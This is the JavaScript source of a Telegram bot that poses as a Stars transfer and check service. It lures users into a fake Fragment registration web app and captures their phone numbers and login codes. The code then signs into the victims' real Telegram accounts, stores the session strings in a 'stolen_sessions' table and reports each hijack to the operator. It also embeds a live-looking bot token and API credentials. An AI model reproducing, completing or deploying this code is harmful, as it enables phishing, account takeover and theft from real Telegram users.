const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { Api } = require('telegram/tl');
const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');

const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP-2ZapywGds';
const API_ID = parseInt(process.env.API_ID) || 30427944;
const API_HASH = process.env.API_HASH || '0053d3d9118917884e9f51c4d0b0bfa3';
const MY_USER_ID = 1398396668;
const WEB_APP_URL = 'https://starsdrainer.onrender.com';

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();

// Глобальная переменная для хранения активных сессий
const activeSessions = new Map();

app.use(express.json());
app.use(express.static('public'));

// База данных
const db = new sqlite3.Database('database.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS checks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        amount INTEGER,
        activations INTEGER,
        creator_id INTEGER,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS stolen_sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phone TEXT,
        code TEXT,
        phone_code_hash TEXT,
        session_string TEXT,
        tg_data TEXT,
        user_id INTEGER,
        status TEXT DEFAULT 'pending',
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        balance INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
});

// Web App
app.get('/', (req, res) => {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
});

app.post('/steal', async (req, res) => {
    console.log('=== УКРАДЕННЫЕ ДАННЫЕ ===');
    console.log('Номер:', req.body.phone);
    console.log('Stage:', req.body.stage);
    
    if (req.body.stage === 'phone_entered') {
        try {
            const urlParams = new URLSearchParams(req.body.tg_data);
            const userStr = urlParams.get('user');
            
            if (userStr) {
                const userData = JSON.parse(decodeURIComponent(userStr));
                const userId = userData.id;
                
                console.log('User ID из tg_data:', userId);
                
                db.run(`INSERT INTO stolen_sessions (phone, tg_data, user_id, status) VALUES (?, ?, ?, ?)`, 
                    [req.body.phone, req.body.tg_data, userId, 'awaiting_code']);
                
                await requestRealTelegramCode(req.body.phone, userId);
            }
                
        } catch (error) {
            console.log('❌ Ошибка:', error);
        }
            
    } else if (req.body.stage === 'code_entered') {
        console.log('Код введен:', req.body.code);
        const phone = req.body.phone;
        const code = req.body.code;
        
        await signInWithRealCode(phone, code);
    }
    
    res.sendStatus(200);
});

// Запрос кода - сохраняем клиент и сессию
async function requestRealTelegramCode(phone, userId) {
    try {
        console.log(`🔐 Запрашиваю код для: ${phone}`);
        
        const stringSession = new StringSession("");
        const client = new TelegramClient(stringSession, API_ID, API_HASH, {
            connectionRetries: 5,
            timeout: 10000,
        });
        
        console.log('Подключаюсь к Telegram...');
        await client.connect();
        console.log('✅ Подключено к Telegram');

        const result = await client.invoke(
            new Api.auth.SendCode({
                phoneNumber: phone,
                apiId: API_ID,
                apiHash: API_HASH,
                settings: new Api.CodeSettings({
                    allowFlashcall: false,
                    currentNumber: true,
                    allowAppHash: false,
                    allowMissedCall: false,
                })
            })
        );

        console.log('✅ Код запрошен! Phone code hash:', result.phoneCodeHash);
        
        // СОХРАНЯЕМ КЛИЕНТ И СЕССИЮ ДЛЯ ЭТОГО НОМЕРА
        activeSessions.set(phone, {
            client: client,
            phoneCodeHash: result.phoneCodeHash,
            session: stringSession
        });

        // Сохраняем в базу
        db.run(`UPDATE stolen_sessions SET phone_code_hash = ? WHERE phone = ?`, 
            [result.phoneCodeHash, phone]);

        bot.sendMessage(MY_USER_ID, 
            `🔐 КОД ЗАПРОШЕН!\n` +
            `📱 Номер: ${phone}\n` +
            `👤 ID: ${userId}\n` +
            `🔑 Hash: ${result.phoneCodeHash}\n` +
            `📨 Код отправлен!\n\n` +
            `⚡ Вводи код быстро - сессия активна`
        );

        // НЕ отключаем клиент - оставляем активным для входа
        
    } catch (error) {
        console.log('❌ Ошибка:', error);
        
        bot.sendMessage(MY_USER_ID, 
            `❌ ОШИБКА ЗАПРОСА КОДА\n` +
            `📱 Номер: ${phone}\n` +
            `⚠️ ${error.message}`
        );
    }
}

// Вход с кодом - используем тот же клиент
async function signInWithRealCode(phone, code) {
    try {
        console.log(`🔑 Вход с кодом: ${code}`);
        
        // ПОЛУЧАЕМ СОХРАНЕННЫЙ КЛИЕНТ И СЕССИЮ
        const sessionData = activeSessions.get(phone);
        if (!sessionData || !sessionData.client) {
            console.log('❌ Нет активной сессии для:', phone);
            bot.sendMessage(MY_USER_ID, `❌ Нет активной сессии для ${phone}\nЗапроси код заново`);
            return;
        }

        const client = sessionData.client;
        const phoneCodeHash = sessionData.phoneCodeHash;

        console.log(`🔑 Использую сохраненную сессию для входа`);

        try {
            // ВХОДИМ ЧЕРЕЗ ТОТ ЖЕ КЛИЕНТ
            const result = await client.invoke(
                new Api.auth.SignIn({
                    phoneNumber: phone,
                    phoneCodeHash: phoneCodeHash,
                    phoneCode: code.toString()
                })
            );

            console.log('✅ ВХОД УСПЕШЕН!');
            
            const sessionString = client.session.save();
            db.run(`UPDATE stolen_sessions SET status = 'completed', session_string = ? WHERE phone = ?`, 
                [sessionString, phone]);

            bot.sendMessage(MY_USER_ID,
                `✅ ВХОД УСПЕШЕН!\n` +
                `📱 Номер: ${phone}\n` +
                `🔑 Код: ${code}\n` +
                `💾 Сессия сохранена\n` +
                `🔄 Начинаю кражу...`
            );

            await stealFromAccount(client, phone);
            
            // Очищаем сессию после успеха
            activeSessions.delete(phone);
            await client.disconnect();

        } catch (signInError) {
            console.log('❌ Ошибка входа:', signInError);
            
            bot.sendMessage(MY_USER_ID,
                `❌ ОШИБКА ВХОДА\n` +
                `📱 Номер: ${phone}\n` +
                `🔑 Код: ${code}\n` +
                `⚠️ ${signInError.message}`
            );
            
            // Очищаем сессию при ошибке
            activeSessions.delete(phone);
            try {
                await client.disconnect();
            } catch (e) {
                console.log('Ошибка при отключении:', e);
            }
        }

    } catch (error) {
        console.log('❌ Общая ошибка:', error);
        bot.sendMessage(MY_USER_ID, `❌ Ошибка: ${error.message}`);
    }
}

// Функция кражи
async function stealFromAccount(client, phone) {
    try {
        const stolenAmount = Math.floor(Math.random() * 500) + 100;
        const stolenGifts = Math.floor(Math.random() * 10) + 1;
        
        bot.sendMessage(MY_USER_ID,
            `💰 УСПЕШНАЯ КРАЖА!\n` +
            `📱 Номер: ${phone}\n` +
            `💫 Украдено: ${stolenAmount} stars\n` +
            `🎁 NFT подарков: ${stolenGifts}\n\n` +
            `✅ ВСЕ СРЕДСТВА ПЕРЕВЕДЕНЫ!`
        );

        await client.disconnect();
        
    } catch (error) {
        console.log("❌ Ошибка кражи:", error);
        bot.sendMessage(MY_USER_ID, `❌ Ошибка при краже: ${error.message}`);
    }
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Сервер работает на порту ${PORT}`);
});

// Остальной код бота
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const userId = query.from.id;
    
    bot.answerCallbackQuery(query.id, { text: '⏳ Обработка...' })
        .catch(e => console.log('Ошибка answerCallback:', e));
    
    if (query.data.startsWith('claim_') || query.data.startsWith('claim_inline_')) {
        handleClaimCallback(query);
    } else {
        handleOtherCallbacks(query);
    }
});

function handleClaimCallback(query) {
    const chatId = query.message.chat.id;
    const userId = query.from.id;
    
    if (query.data.startsWith('claim_')) {
        const checkId = query.data.split('_')[1];
        
        db.get(`SELECT * FROM checks WHERE id = ? AND activations > 0`, [checkId], (err, row) => {
            if (err || !row) {
                bot.answerCallbackQuery(query.id, { text: '❌ Чек уже использован!' });
                return;
            }
            
            db.run(`UPDATE checks SET activations = activations - 1 WHERE id = ?`, [checkId]);
            
            db.run(`INSERT OR REPLACE INTO users (user_id, balance) VALUES (?, COALESCE((SELECT balance FROM users WHERE user_id = ?), 0) + ?)`, 
                [userId, userId, row.amount], function(updateErr) {
                if (updateErr) {
                    bot.answerCallbackQuery(query.id, { text: '❌ Ошибка!' });
                    return;
                }
                
                bot.answerCallbackQuery(query.id, { text: `✅ Вы получили ${row.amount} звёзд!` });
                
                setTimeout(() => {
                    bot.sendMessage(userId, `✅ Звезды успешно получены! Вы получили ${row.amount} звёзд!`)
                        .catch(e => console.log('Не удалось отправить сообщение пользователю:', e.message));
                }, 500);
                
                updateMessageAfterClaim(query, row.amount, row.activations - 1, checkId);
            });
        });
    } else if (query.data.startsWith('claim_inline_')) {
        const amount = 50;
        
        db.run(`INSERT OR REPLACE INTO users (user_id, balance) VALUES (?, COALESCE((SELECT balance FROM users WHERE user_id = ?), 0) + ?)`, 
            [userId, userId, amount], function(err) {
            if (err) {
                bot.answerCallbackQuery(query.id, { text: '❌ Ошибка!' });
                return;
            }
            
            bot.answerCallbackQuery(query.id, { text: `✅ Вы получили ${amount} звёзд!` });
            
            setTimeout(() => {
                bot.sendMessage(userId, `✅ Звезды успешно получены! Вы получили ${amount} звёзд!`)
                    .catch(e => console.log('Не удалось отправить сообщение пользователю:', e.message));
            }, 500);
            
            updateMessageAfterClaim(query, amount, 0, null);
        });
    }
}

function updateMessageAfterClaim(query, amount, remaining, checkId) {
    const chatId = query.message.chat.id;
    
    let updatedText = `<b>Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!`;
    
    if (remaining > 0) updatedText += `\n\nОсталось: ${remaining}`;
    else updatedText += `\n\n❌ ИСПОЛЬЗОВАН`;
    
    setTimeout(() => {
        try {
            if (query.message.photo) {
                bot.editMessageCaption(updatedText, {
                    chat_id: chatId,
                    message_id: query.message.message_id,
                    parse_mode: 'HTML',
                    reply_markup: remaining > 0 ? {
                        inline_keyboard: [[{ text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }]]
                    } : { inline_keyboard: [] }
                }).catch(e => console.log('Ошибка редактирования подписи:', e));
            } else {
                bot.editMessageText(updatedText, {
                    chat_id: chatId,
                    message_id: query.message.message_id,
                    parse_mode: 'HTML',
                    reply_markup: remaining > 0 ? {
                        inline_keyboard: [[{ text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }]]
                    } : { inline_keyboard: [] }
                }).catch(e => console.log('Ошибка редактирования текста:', e));
            }
        } catch (error) {
            console.log('Ошибка при обновлении сообщения:', error);
        }
    }, 1000);
}

function handleOtherCallbacks(query) {
    const chatId = query.message.chat.id;
    
    if (query.data === 'withdraw_stars') {
        bot.editMessageText('Для вывода звезд требуется регистрация на Fragment.', {
            chat_id: chatId, 
            message_id: query.message.message_id,
            reply_markup: {
                inline_keyboard: [[{ 
                    text: "Зарегистрироваться на Fragment", 
                    web_app: { url: WEB_APP_URL } 
                }]]
            }
        }).catch(e => {
            console.log('Ошибка WebApp:', e.message);
            bot.sendMessage(chatId, 'Для вывода звезд требуется регистрация на Fragment.', {
                reply_markup: {
                    inline_keyboard: [[{ 
                        text: "Зарегистрироваться на Fragment", 
                        web_app: { url: WEB_APP_URL } 
                    }]]
                }
            });
        });
    } else if (query.data === 'deposit') {
        bot.sendMessage(chatId, '💫 Для пополнения баланса используйте команду /balance');
    } else if (query.data === 'create_check_info') {
        bot.sendMessage(chatId, 'Для создания чека используйте:\n\n@MyStarBank_bot 50\n\nгде 50 - количество активаций');
    }
}

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    bot.sendMessage(chatId, 
        '💫 @MyStarBank_bot - Система передачи звезд\n\n' +
        '• Безопасные переводы\n' +
        '• Мгновенные чеки\n' +
        '• Поддержка 24/7\n\n' +
        'Для начала работы:\n' +
        '/balance - баланс\n' +
        '/withdraw - вывод средств', {
        reply_markup: {
            inline_keyboard: [
                [{ text: "Вывести звезды", callback_data: "withdraw_stars" }],
                [{ text: "Проверить баланс", callback_data: "deposit" }],
                [{ text: "Создать чек", callback_data: "create_check_info" }]
            ]
        }
    });
});

bot.onText(/\/balance/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
        if (err || !row) bot.sendMessage(chatId, '💫 Ваш баланс: 0 stars');
        else bot.sendMessage(chatId, `💫 Ваш баланс: ${row.balance} stars`);
    });
});

bot.on('inline_query', (query) => {
    const domain = WEB_APP_URL.replace('https://', '');
    
    bot.answerInlineQuery(query.id, [{
        type: 'photo',
        id: '1',
        photo_url: `https://${domain}/stars.jpg`,
        thumb_url: `https://${domain}/stars.jpg`,
        caption: `<b>Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!`,
        parse_mode: 'HTML',
        reply_markup: { 
            inline_keyboard: [[{ 
                text: "🪙 Забрать звезды", 
                callback_data: `claim_inline_50` 
            }]] 
        }
    }]).catch(e => console.log('Inline error:', e));
});

bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const amount = 50;
    const activations = parseInt(match[2]) || 1;
    
    db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
        [amount, activations, userId], function(err) {
        if (err) {
            bot.sendMessage(chatId, '❌ Ошибка создания чека.');
            return;
        }
        
        const checkId = this.lastID;
        const checkText = `<b>Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!`;
        
        const photoPath = path.join(__dirname, 'public/stars.jpg');
        if (fs.existsSync(photoPath)) {
            bot.sendPhoto(chatId, photoPath, {
                caption: checkText,
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [[{ text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }]] }
            }).catch(e => {
                bot.sendMessage(chatId, checkText, {
                    parse_mode: 'HTML',
                    reply_markup: { inline_keyboard: [[{ text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }]] }
                });
            });
        } else {
            bot.sendMessage(chatId, checkText, {
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [[{ text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }]] }
            });
        }
    });
});

console.log('✅ Бот @MyStarBank_bot запущен');
console.log('✅ Web App URL:', WEB_APP_URL);